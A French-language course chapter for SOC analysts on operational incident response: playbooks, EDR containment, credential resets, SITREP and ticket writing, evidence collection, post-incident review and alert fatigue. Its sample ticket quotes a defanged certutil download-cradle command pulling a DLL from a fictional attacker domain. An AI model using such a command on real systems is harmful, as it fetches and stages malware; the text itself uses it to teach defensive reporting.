---
title: Partie V — Réponse opérationnelle
source: Cyber/99_Concepts/Analyste_SOC.md
note: Analyste SOC
up:
- - Analyste SOC
  - index.md
---

*La réponse de premier et deuxième niveau — ce que le SOC fait avant et pendant l'escalade IR.*

---


## Chapitre 24 — Playbooks et procédures de réponse

Un playbook est une procédure structurée pour un type d'incident spécifique. Ce n'est pas un script rigide — c'est un guide qui garantit la cohérence entre analystes (deux analystes face au même incident doivent prendre les mêmes actions essentielles), la complétude (aucune étape critique n'est oubliée sous la pression), et la traçabilité (chaque action est documentée dans le ticket).

Structure d'un playbook : conditions de déclenchement (quelle alerte, quelle qualification), étapes de vérification (comment confirmer le VP), actions de confinement (isolation, blocage, reset), actions d'éradication (suppression du malware, nettoyage de la persistence), communication (qui informer, à quel moment, dans quel format), critères d'escalade (quand basculer vers l'IR/CERT), et clôture (documentation, REX, mise à jour des IoC).

L'articulation playbook → SOAR : les étapes automatisables du playbook sont implémentées dans le SOAR (enrichissement automatique, blocage d'IoC, création de ticket) ; les étapes de jugement restent humaines (qualification VP/FP, décision de confinement impactant, escalade).

---


## Chapitre 25 — Confinement : actions de premier niveau

Les actions que l'analyste SOC peut exécuter (selon les droits définis dans la politique de réponse du client/de l'organisation).

**Isolation endpoint via EDR :** CrowdStrike Falcon (Network Containment — l'endpoint est coupé du réseau mais reste joignable par le cloud CrowdStrike pour la collecte et les commandes), SentinelOne (Disconnect from Network), MDE (Isolate Device). L'isolation est l'action de confinement la plus efficace et la plus rapide — elle coupe immédiatement les communications de l'attaquant.

**Blocage d'IoC :** ajout de domaines C2, d'IP, et de hash aux listes de blocage du proxy, du firewall, et de l'EDR. Procédure : vérifier que l'IoC est confirmé (ne pas bloquer une IP Google parce qu'elle apparaît dans une alerte de beaconing), documenter le blocage (qui, quand, pourquoi, IoC exact), et vérifier l'effet (le trafic vers l'IoC est-il effectivement bloqué ?).

**Reset de credentials :** reset du mot de passe AD + révocation des sessions Azure AD/M365 (via PowerShell `Revoke-AzureADUserAllRefreshToken` ou portail Entra ID) + invalidation des tokens Kerberos (le reset du mot de passe AD ne suffit pas si l'attaquant a un TGT valide — il faut réinitialiser le mot de passe du compte krbtgt deux fois pour invalider les Golden Tickets, mais cette action est réservée à l'IR lead car elle impacte tout le domaine).

**Désactivation de compte :** en cas de compromission confirmée — le compte est désactivé dans l'AD et les sessions sont révoquées immédiatement.

---


## Chapitre 26 — Communication, escalade et rédaction du ticket SOC

### 26.1 Le situation report (SITREP)

Quand escalader, le format est : **Quoi** (résumé en 2 phrases — « Compromission confirmée de WKS-PROD-112 chez Norexia, mouvement latéral détecté vers WKS-IT-045, Kerberoasting ciblant le compte svc-scada avec accès SCADA »), **Quand** (timeline résumée — « Infection initiale samedi 08h12, mouvement latéral samedi 22h30, Kerberoasting dimanche 06h15, détection lundi 07h42 »), **Qui** (comptes et systèmes impactés — « Comptes : marc.dubois, svc-scada (non confirmé cracké). Machines : WKS-PROD-112, WKS-IT-045. Potentiel : accès SCADA »), **Actions prises** (« Isolation des 2 postes via EDR, blocage du C2, reset mot de passe marc.dubois »), **Actions recommandées** (« Reset svc-scada, audit des accès SCADA, investigation forensique complète, notification RSSI Norexia »), **Ce qu'on ne sait pas encore** (« Le mot de passe svc-scada a-t-il été cracké ? L'attaquant a-t-il accédé au réseau OT ? Y a-t-il d'autres machines compromises ? »).

### 26.2 Le ticket SOC : un livrable professionnel

Un ticket SOC bien rédigé est la trace de l'investigation. Il doit être compréhensible par un collègue qui ne connaît pas le contexte, reproductible (un autre analyste peut refaire les mêmes requêtes), et factuel (faits horodatés, pas de spéculation non qualifiée).

Structure du ticket : **Résumé** (1-2 phrases : quoi, qui, quand — « Alerte certutil download cradle sur WKS-PROD-112, qualification : vrai positif, infection par document Office malveillant avec RAT custom et beaconing C2 »). **Contexte** (règle déclenchée, sévérité, asset concerné, utilisateur). **Observations** (faits extraits des logs, horodatés, avec la source et la requête SIEM — « 07h42:15 UTC — Sysmon Event 1 — certutil.exe PID 9215, parent cmd.exe PID 9201, parent WINWORD.EXE PID 8412. CommandLine : certutil -urlcache -split -f hxxps://update-norexia[.]xyz/lib.dll C:\Users\Public\lib.dll »). **Analyse** (hypothèses testées et conclusions — « L'utilisateur a ouvert un document Word piégé contenant une macro qui a déclenché un download cradle via certutil. Le fichier téléchargé est un RAT custom (SHA-256 : a7f3..., 0 détection VT) qui communique via HTTPS avec le C2 185.xx.xx.xx. »). **Actions réalisées** (ce que l'analyste a fait — isolation, blocage, reset). **Recommandations** (ce qui reste à faire — forensique, scope élargi, notification). **Statut** (Ouvert / Escalé / Clos — avec la qualification finale : VP, FP, BTP).

Un bon ticket se lit comme un rapport d'investigation condensé — pas comme une liste de copier-coller de logs sans contexte.

---


## Chapitre 27 — Collecte d'artefacts et préservation de preuves

Le SOC collecte, le CERT/forensicien analyse. Ce que l'analyste SOC doit savoir collecter : triage **KAPE** (collecte automatisée des artefacts Windows critiques — Event Logs, registre, Prefetch, Amcache, $MFT, navigateurs — en 5-10 minutes via une clé USB ou via le réseau), dump mémoire (DumpIt, WinPmem — si la machine est allumée et que le contenu de la RAM est critique — credentials en mémoire, processus malveillants), collecte via **Velociraptor** (hunts et collectes à distance sur le parc — VQL pour cibler les artefacts spécifiques sans intervention physique), et export de logs (les logs SIEM/proxy/firewall de la période de l'incident, archivés et hashés pour la chaîne de custody).

La chaîne de custody simplifiée : même en investigation interne, documenter qui a collecté quoi, quand, comment, et hasher (SHA-256) chaque artefact. L'affaire peut basculer en judiciaire si l'ampleur est révélée — et les preuves collectées sans rigueur au début sont inexploitables devant un tribunal. Renvoi vers le cours Forensic de la bibliothèque pour le détail de la méthodologie forensique.

---


## Chapitre 28 — Post-incident : REX, tuning et amélioration

Le REX (Retour d'Expérience / Lessons Learned) est la phase la plus négligée et la plus rentable du cycle d'incident. Structure : ce qui s'est passé (résumé factuel), comment ça a été détecté (quelle règle, quel délai, quel analyste), ce qui a fonctionné (quelle action de confinement a été efficace, quel playbook a bien guidé la réponse), ce qui n'a pas fonctionné (quels gaps de détection, quels logs manquants, quels délais excessifs), et les améliorations à apporter (nouvelles règles, nouvelles sources de logs, mise à jour de playbooks, formation).

Le tuning post-incident : les règles qui n'ont pas détecté l'attaque → nouvelles règles Sigma à créer (dans FALCONWATCH : le mouvement latéral PsExec n'a pas été détecté en temps réel parce que la règle existante excluait le compte marc.dubois comme « utilisateur IT autorisé » → l'exception est revue, le compte est retiré de l'exclusion), les sources de logs manquantes → collecte à ajouter (Sysmon n'était pas déployé sur les postes OT chez Norexia → recommandation de déploiement), et les playbooks à mettre à jour (le playbook ransomware est enrichi avec les étapes de vérification des shadow copies et de scope assessment SCADA).

---


## Chapitre 29 — Gestion d'un flux d'alertes : priorisation et endurance

Le quotidien de l'analyste SOC n'est pas une investigation unique — c'est un flux continu d'alertes de sévérités et de contextes variés. La gestion de ce flux est une compétence en soi.

La **priorisation** : les alertes critiques sont traitées immédiatement (< 15 minutes), les hautes dans l'heure, les moyennes dans les 4 heures, les basses en fin de shift si le temps le permet. Le backlog (alertes en attente) est monitoré en temps réel — un backlog qui grandit est un signal de surcharge.

La **fatigue d'alerte** est le piège le plus insidieux : un SOC qui génère 500 alertes/jour dont 400 FP crée les conditions de l'échec — les analystes ne regardent plus les alertes, et le VP noyé dans les FP n'est pas vu. La lutte contre la fatigue passe par le tuning agressif des règles (Ch.7), l'automatisation du triage des alertes de faible valeur (SOAR — Ch.31), la rotation des tâches (pas toujours du triage, alterner avec du hunting ou du detection engineering), et la communication avec le management (la fatigue d'alerte est un problème organisationnel, pas individuel).

L'**hygiène mentale** : le SOC est un environnement à haute pression (décisions sous contrainte de temps, alertes en continu, travail en shift). Les bonnes pratiques : pause entre les séries d'alertes, rotation des rôles, formation continue pour maintenir la motivation, communication des frustrations, et reconnaissance du travail bien fait (un VP détecté et confiné rapidement mérite d'être célébré).

---
